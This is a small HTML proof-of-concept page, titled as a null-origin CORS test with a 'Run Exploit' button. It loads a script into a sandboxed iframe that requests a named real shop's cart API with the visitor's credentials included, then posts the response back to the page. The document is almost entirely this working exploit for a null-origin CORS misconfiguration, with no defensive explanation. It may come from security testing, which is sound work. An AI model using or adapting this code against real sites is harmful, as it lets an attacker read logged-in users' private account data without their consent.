<!DOCTYPE html>
<html>

<body>

<h2>Null Origin CORS Test</h2>

<button onclick="run()">Run Exploit</button>

<pre id="result"></pre>

<iframe id="frame" sandbox="allow-scripts" style="display:none"></iframe>

<script>

window.addEventListener("message",e=>{
document.getElementById("result").textContent = e.data
})

function run(){

let payload = `
<script>

fetch("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",{
credentials:"include"
})
.then(r=>r.text())
.then(d=>{
parent.postMessage(d,"*")
})
.catch(e=>{
parent.postMessage(e.toString(),"*")
})

<\/script>
`

document.getElementById("frame").srcdoc = payload

}

</script>

</body>
</html>
